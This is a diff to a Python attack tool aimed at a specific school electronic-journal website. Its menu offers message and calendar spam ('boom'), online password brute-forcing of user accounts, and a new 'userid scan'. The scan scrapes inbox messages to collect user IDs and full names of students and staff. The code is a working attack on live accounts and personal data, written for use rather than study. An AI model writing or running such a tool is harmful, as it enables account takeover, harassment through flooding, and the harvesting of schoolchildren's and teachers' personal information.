@@ -4,6 +4,7 @@ import random
 import os
 import time
 import json
+import re
 
 BASE = "https://eljur.gospmr.org"
 # logo
@@ -22,6 +23,7 @@ domain = ""
 
 session = requests.Session()
 
+
 # функция измены ссесии
 def ses_update():
     session.headers.update({
@@ -34,7 +36,8 @@ def ses_update():
         "Accept-Language": "ru-RU,ru;q=0.9",
         "Origin": BASE,
         "Referer": f"{BASE}/authorize",
-    })
+
+})
 
 
 ses_update()
@@ -44,7 +47,6 @@ def get_soup(url):
     r = session.get(url)
     r.encoding = "utf-8"
     return BeautifulSoup(r.text, "html.parser")
-
 
 # функция регистрации элжура в ссесии (надо проверить работу)
 def reg(login_val, password_val):
@@ -59,13 +61,14 @@ def reg(login_val, password_val):
         if response.text == r"""{"actions":[],"errors":[{"field":null,"text":"\u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u043b\u043e\u0433\u0438\u043d \u0438\u043b\u0438 \u043f\u0430\u0440\u043e\u043b\u044c"}],"result":false}""":
             return "Неверный логин или пароль"
         elif r""""result":true""" in str(response.text):
-            domain = json.loads(str(json.loads(str(response.text))["actions"]).replace("[", "").replace("]", "").replace("'", '"'))["url"].replace(f"/?user={login_val}&domain=", "")
+            domain = json.loads(
+                str(json.loads(str(response.text))["actions"]).replace("[", "").replace("]", "").replace("'", '"'))[
+                "url"].replace(f"/?user={login_val}&domain=", "")
             return "ok"
         else:
             return response.text
     except Exception as e:
         return e
-
 
 
 # функция создания календаря
@@ -110,7 +113,6 @@ def razved_cal(iddd):
         f"https://eljur.gospmr.org/journal-calendar-api-action/type.event/action.one?id={iddd}").text.encode(
         'utf-8').decode('unicode_escape')
 
-
 # функция интерфейса для введения логина и пароля
 def login_password():
     global login, password
@@ -140,7 +142,8 @@ def menu():
     global domain
     while True:
         print(logo)
-        print(f"\n                  ВВЕДИТЕ НОМЕР ДЕЙСТВИЯ      domain={domain}\n\n  1)message boom\n  2)scan calendar\n  3)calendar boom\n  4)brute online\n  99)exit")
+        print(
+            f"\n                  ВВЕДИТЕ НОМЕР ДЕЙСТВИЯ      domain={domain}\n\n  1)message boom\n  2)scan calendar\n  3)calendar boom\n  4)brute online\n  5)userid scan\n  99)exit")
         go = input(" >>   ")
         if go == "1":
             os.system('cls' if os.name == 'nt' else 'clear')
@@ -154,7 +157,9 @@ def menu():
         elif go == "4":
             os.system('cls' if os.name == 'nt' else 'clear')
             brute_online()
-            break
+        elif go == "5":
+            os.system('cls' if os.name == 'nt' else 'clear')
+            userid_scan()
         elif go == "99":
             os.system('cls' if os.name == 'nt' else 'clear')
             break
@@ -215,7 +220,8 @@ def calendar_scan():
     time.sleep(2)
     os.system('cls' if os.name == 'nt' else 'clear')
     menu()
-    
+
+
 # функция интерфейса для публикации календарей
 def calendar_go():
     print(logo)
@@ -263,6 +269,29 @@ def brute_online():
             N += 1
         if gg_stabilizator == False:
             print(f"Нету подходящих паролей к {login}")
+    print("Готово!")
+    time.sleep(2)
+    os.system('cls' if os.name == 'nt' else 'clear')
+    menu()
+
+# функция интерфейса для разведки userid
+def userid_scan():
+    print(logo)
+    print("\n                  Вы выбрали userid scan\n")
+    #log_file = input("log_file>>  ")
+    #with open(log_file, "r", encoding='utf-8') as f:
+    dd = json.loads(str(get_soup(f"{BASE}/journal-api-messages-action?method=messages.get_list&category=inbox&search=&limit=00&offset=0&teacher=0&status=&companion=&minDate=0")))
+    n = 0
+    legit_check = ""
+    while n <= len(dd):
+        pp = get_soup(f"{BASE}/journal-messages-view-action?item={dd["list"][n]["id"]}")
+        match = re.search(r"var allReceivers\s*=\s*(\[.*?\]);", str(pp), re.DOTALL)
+        receivers = json.loads(match.group(1))
+        for r in receivers:
+            if f"i{r["uid"]}" not in legit_check:
+            	print(f"{r["uid"]}-{r["full_fio"].replace(" ", "-")}")
+            	legit_check = f"{legit_check}i{r["uid"]}"
+        n += 1
     print("Готово!")
     time.sleep(2)
     os.system('cls' if os.name == 'nt' else 'clear')
